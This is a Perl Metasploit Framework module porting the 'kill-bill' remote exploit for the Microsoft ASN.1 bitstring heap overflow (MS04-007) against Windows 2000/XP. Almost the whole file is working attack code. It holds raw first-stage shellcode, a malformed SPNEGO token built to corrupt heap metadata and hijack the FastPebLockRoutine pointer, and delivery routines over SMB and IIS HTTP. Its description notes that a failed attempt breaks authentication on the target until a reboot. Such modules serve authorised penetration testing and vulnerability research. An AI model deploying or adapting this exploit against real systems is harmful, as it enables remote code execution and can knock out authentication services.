
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::msasn1_ms04_007_killbill;
use base "Msf::Exploit";
use strict;

# This is a straight port of Solar Eclipse's "kill-bill" exploit, published
# as a Metasploit Framework module with his permission. This module is only
# licensed under GPLv2, keep this in mind if you embed the Framework into
# a non-GPL application. -hdm[at]metasploit.com

my $advanced = { };
my $info =
  {
	'Name'  => 'Microsoft ASN.1 Library Bitstring Heap Overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors' =>
	  [
		'Solar Eclipse <solareclipse [at] phreedom.org> [GPLv2 License]',
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 1,
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target service port', 445],
		'SSL'    => [0, 'BOOL', 'The target service uses SSL'],
		'PROTO'  => [1, 'DATA', 'Protocol (smb or http)', 'smb'],
	  },

	'Payload' =>
	  {
		'Space' 	=> 1024,
		'Prepend'	=> "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This is an exploit for a previously undisclosed vulnerability in the 
		bit string decoding code in the Microsoft ASN.1 library. This vulnerability
		is not related to the bit string vulnerability described in eEye advisory 
		AD20040210-2. Both vulnerabilities were fixed in the MS04-007 patch.
		
		You are only allowed one attempt with this vulnerability, if the payload
		does not execute, there is a good chance the target system will not longer
		be able to process authentication requests. A reboot is required to restore
		proper functioning of an exploited system.
}),

	'Refs'  =>
	  [
		['URL',		'http://www.phreedom.org/solar/exploits/msasn1-bitstring/'],
		['MSB',     'MS04-007'],
		['CVE',		'2003-0818'],
	  ],

	'DefaultTarget' => 0,

	'Targets'   =>
	  [
		['Windows 2000 SP2-SP4 + Windows XP SP0-SP1'],
	  ],

	'Keys'  =>  ['asn1'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $target_app  = $self->GetVar('PROTO');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	# The first stage shellcode fixes the PEB pointer and cleans the heap
	my $stage0 =
	  "\x53\x56\x57\x66\x81\xec\x80\x00\x89\xe6\xe8\xed\x00\x00\x00\xff".
	  "\x36\x68\x09\x12\xd6\x63\xe8\xf7\x00\x00\x00\x89\x46\x08\xe8\xa2".
	  "\x00\x00\x00\xff\x76\x04\x68\x6b\xd0\x2b\xca\xe8\xe2\x00\x00\x00".
	  "\x89\x46\x0c\xe8\x3f\x00\x00\x00\xff\x76\x04\x68\xfa\x97\x02\x4c".
	  "\xe8\xcd\x00\x00\x00\x31\xdb\x68\x10\x04\x00\x00\x53\xff\xd0\x89".
	  "\xc3\x56\x8b\x76\x10\x89\xc7\xb9\x10\x04\x00\x00\xf3\xa4\x5e\x31".
	  "\xc0\x50\x50\x50\x53\x50\x50\xff\x56\x0c\x8b\x46\x08\x66\x81\xc4".
	  "\x80\x00\x5f\x5e\x5b\xff\xe0\x60\xe8\x23\x00\x00\x00\x8b\x44\x24".
	  "\x0c\x8d\x58\x7c\x83\x43\x3c\x05\x81\x43\x28\x00\x10\x00\x00\x81".
	  "\x63\x28\x00\xf0\xff\xff\x8b\x04\x24\x83\xc4\x14\x50\x31\xc0\xc3".
	  "\x31\xd2\x64\xff\x32\x64\x89\x22\x31\xdb\xb8\x90\x42\x90\x42\x31".
	  "\xc9\xb1\x02\x89\xdf\xf3\xaf\x74\x03\x43\xeb\xf3\x89\x7e\x10\x64".
	  "\x8f\x02\x58\x61\xc3\x60\xbf\x20\xf0\xfd\x7f\x8b\x1f\x8b\x46\x08".
	  "\x89\x07\x8b\x7f\xf8\x81\xc7\x78\x01\x00\x00\x89\xf9\x39\x19\x74".
	  "\x04\x8b\x09\xeb\xf8\x89\xfa\x39\x5a\x04\x74\x05\x8b\x52\x04\xeb".
	  "\xf6\x89\x11\x89\x4a\x04\xc6\x43\xfd\x01\x61\xc3\xa1\x0c\xf0\xfd".
	  "\x7f\x8b\x40\x1c\x8b\x58\x08\x89\x1e\x8b\x00\x8b\x40\x08\x89\x46".
	  "\x04\xc3\x60\x8b\x6c\x24\x28\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea".
	  "\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x38\x49\x8b\x34\x8b\x01\xee".
	  "\x31\xff\x31\xc0\xfc\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb".
	  "\xf4\x3b\x7c\x24\x24\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b".
	  "\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc2".
	  "\x08\x00\xeb\xfe";

	my $token = SPNEGO::token($stage0, $shellcode);
	my $sock  = Msf::Socket::Tcp->new
	  (
		'PeerAddr'	=> $target_host,
		'PeerPort'	=> $target_port,
		'SSL'		=> $self->GetVar('SSL'),
	  );

	if ($sock->IsError) {
		$self->PrintLine("[*] Could not connect: ".$sock->GetError());
		return;
	}

	if ($target_app eq 'http') {
		return $self->ExploitIIS($sock, $token);
	}

	if ($target_app eq 'smb') {
		return $self->ExploitSMB($sock, $token);
	}

	# Currently non-functional
	# if ($target_app eq 'smtp') {
	#	return $self->ExploitSMTP($sock, $token);
	# }

	$self->PrintLine("[*] Invalid application protocol was selected");
	return;
}

sub ExploitIIS {
	my $self = shift;
	my $sock = shift;
	my $nego = shift;
	my $resp;

	my $req =
	  "GET / HTTP/1.0\r\n" .
	  "Host: ".$self->GetVar('RHOST')."\r\n" .
	  "Authorization: Negotiate " . Pex::Text::Base64Encode($nego, '').
	  "\r\n\r\n";

	$self->PrintLine("[*] Sending HTTP NTLM negotiate request...");

	$sock->Send($req);
	$resp = $sock->Recv(-1, 10);

	if ($resp =~ /0x80090301/) {
		$self->PrintLine("[*] Server does not support the Negotiate protocol or it has already been exploited");
	}
	if ($resp =~ /0x80090304/) {
		$self->PrintLine("[*] Server responded with error code 0x80090304");
	}

	$self->Handler($sock);
	$sock->Close;
	return;
}

sub ExploitSMB {
	my $self = shift;
	my $sock = shift;
	my $nego = shift;
	my $resp;

	$self->PrintLine("[*] Sending SMB negotiate request...");
	$sock->Send(SMB::smb_negotiate());
	$resp = $sock->Recv(-1, 5);

	$self->PrintLine("[*] Sending SMB session_setup request...");
	$sock->Send(SMB::smb_sessionsetup($nego));
	$resp = $sock->Recv(-1, 5);

	$self->Handler($sock);
	$sock->Close;
	return;
}

sub ExploitSMTP {
	my $self = shift;
	my $sock = shift;
	my $nego = shift;
	my $resp;

	my $bann = $sock->Recv(-1, 10);
	$bann =~ s/\r|\n//g;

	$self->PrintLine("[*] Banner: $bann");

	$sock->Send("EHLO metasploit.com\r\n");
	$resp = $sock->RecvLineMulti(5);

	$sock->Send("AUTH GSSAPI\r\n");
	$resp = $sock->RecvLineMulti(5);

	$self->PrintLine("[*] Sending GSSAPI authentication...");
	$sock->Send(Pex::Text::Base64Encode($nego, '')."\r\n");
	$resp = $sock->RecvLineMulti(5);
	$resp =~ s/\r|\n//g;
	$self->PrintLine("[*] Response: $resp");

	$self->Handler($sock);
	$sock->Close;
}

#
# Taken directly from kill-bill/SPNEGO.pm
#

package SPNEGO;
use strict;

#
# Returns the length of a string as ASN.1 BER encoded length octets,
# followed by the string.
#

sub asn1
{
	my $str = shift;
	my $len = length($str);

	if ($len < 0x7f) {
		return chr($len) . $str;
	}
	elsif ($len <= 0xffff) {
		return chr(0x82) . chr($len >> 8) . chr($len & 0xff) . $str;
	}
	else {
		die("len > 0xffff\n");
	}
}

#
# Returns a BER encoded bit string
#

sub bits
{
	my $str = shift;

	return "\x03" . asn1("\x00" . $str);	# Bit String, 0 unused bits
}

#
# Returns a BER encoded constructed bit string
#

sub constr
{
	my $str;
	for (@_) { $str .= $_ };

	return "\x23" . asn1($str);		# Constructed Bit String
}

#
# Returns a BER encoded SPNEGO token
#

sub token
{
	my $stage0 = shift;
	my $stage1 = shift;

	if (!$stage0 || !$stage1) {
		die "Invalid paramters in SPNEGO::token_short()\n";
	}

	if (length($stage0) > 1032) {
		die "stage0 shellcode longer than 1032 bytes\n";
	}

	# This is the tag placed before the stage1 shellcode.
	my $tag = "\x90\x42\x90\x42\x90\x42\x90\x42";

	if (length($tag) + length($stage1) > 1033) {
		die "stage1 shellcode longer than " . 1033-length($tag) . " bytes\n";
	}

	# The first two overwrites must succeed, so we write to an unused location
	# in the PEB block. We don't care about the values, because after this the
	# doubly linked list of free blocks is corrupted and we get to the second
	# overwrite which is more useful.

	my $fw = "\xf8\x0f\x01\x00";		# 0x00010ff8
	my $bk = "\xf8\x0f\x01";

	# The second overwrite writes the address of our shellcode into the
	# FastPebLockRoutine pointer in the PEB

	my $peblock = "\x20\xf0\xfd\x7f";			# FastPebLockRoutine in PEB

	my $bitstring =
	  constr(
		bits("A"x1024),
		"\x03\x00",
		constr(
			bits($tag . $stage1 . 'B'x(1033-length($tag . $stage1))),
			constr(
				bits($fw . $bk)
			  ),
			constr(
				bits("CCCC".$peblock.$stage0 . "C"x(1032-length($stage0))),
				constr(
					bits("\xeb\x06\x90\x90\x90\x90\x90\x90"),
					bits("D"x1040)
				  )
			  )
		  )
	  );

	my $token =
	  "\x60" . asn1(						# Application Constructed Object
		"\x06\x06\x2b\x06\x01\x05\x05\x02" .	# SPNEGO OID
		  "\xa0" . asn1(					# NegTokenInit (0xa0)
			"\x30" . asn1(				# Constructed Sequence
				"\xA1" . asn1(			# ContextFlags (0xa1)
					$bitstring
				  )
			  )
		  )
	  );

	return $token;
}

#
# Returns a BER encoded SPNEGO token which crashes LSASS.EXE
#

sub token_eeye
{
	my $token =
	  "\x60" . asn1(						# Application Constructed Object
		"\x06\x06\x2b\x06\x01\x05\x05\x02" . # SPNEGO OID
		  "\xa0" . asn1(					# NegTokenInit (0xa0)
			"\x30" . asn1(				# Constructed Sequence
				"\xA1" . asn1(			# ContextFlags (0xa1)
					"\x23\x03\x03\x01\x07"
				  )
			  )
		  )
	  );

	return $token;
}

#
# Modified from kill-bill/SMB.pm
#

package SMB;
use strict;

sub smb
{
	my $msg = shift;

	return pack("N", length($msg)) . $msg;
}

#
# Exploit LSASS.EXE through SMB
#

sub smb_negotiate {
	my $pid = 0x1337;
	my $negotiate_req =

	  # SMB Message Header

	  "\xff\x53\x4d\x42".		# protocol id
	  "\x72".					# command (NEGOTIATE_MESSAGE)
	  "\x00\x00\x00\x00".		# status
	  "\x18".					# flags (pathnames are case-insensitive)
	  "\x53\xC8".				# flags2 (support Unicode, NT error codes, long
	  # filenames, extended security negotiation and
	  # extended attributes)
	  "\x00\x00".				# Process ID high word
	  "\x00\x00\x00\x00".		# signature
	  "\x00\x00\x00\x00".
	  "\x00\x00".				# reserved
	  "\x00\x00".				# Tree ID
	  pack("v", $pid).		# Process ID
	  "\x00\x00".				# User ID
	  "\x00\x00".				# Multiplex ID

	  # SMB Message Parameters

	  "\x00".					# word count

	  # SMB Message Data
	  "\x62\x00".				# byte count

	  "\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47".
	  "\x52\x41\x4D\x20\x31\x2E\x30\x00". # PC NETWORK PROGRAM 1.0

	  "\x02\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00". # LANMAN1.0

	  "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72".
	  "\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00". # WfW 3.1a

	  "\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00". # LM1.2X002

	  "\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00". # LANMAN2.1

	  "\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00"; # NT LM 0.12
	return smb($negotiate_req);
}

sub smb_sessionsetup {
	my $token = shift;
	my $pid = 0x1337;
	my $session_setup_req =

	  # SMB Message Header

	  "\xff\x53\x4d\x42".		# protocol id
	  "\x73".					# command (Session Setup AndX)
	  "\x00\x00\x00\x00".		# status
	  "\x18".					# flags (pathnames are case-insensitive)
	  "\x07\xC8".				# flags2 (support Unicode, NT error codes, long
	  # filenames, extended security negotiation and
	  # extended attributes and security signatures)
	  "\x00\x00".				# Process ID high word
	  "\x00\x00\x00\x00".		# signature
	  "\x00\x00\x00\x00".
	  "\x00\x00".				# reserved
	  "\x00\x00".				# Tree ID
	  pack("v", $pid).		# Process ID
	  "\x00\x00".				# User ID
	  "\x00\x00".				# Multiplex ID

	  # SMB Message Parameters

	  "\x0c".					# word count (12 words)

	  "\xff".					# AndXCommand: No further commands
	  "\x00".					# reserved

	  "\x00\x00".				# AndXOffset
	  "\x04\x11".				# max buffer: 4356
	  "\x0a\x00".				# max mpx count: 10

	  "\x00\x00".				# VC number
	  "\x00\x00\x00\00".		# session key

	  pack("v", length($token)).	# security blob length
	  "\x00\x00\x00\x00".		# reserved

	  "\xd4\x00\x00\x80".		# capabilities

	  # SMB Message Data

	  pack("v", length($token)+0).	# byte count (+72)

	  $token.					# security blob

	  "\x00\x00\x00\x00\x00\x00";

	return smb($session_setup_req);
}

1;
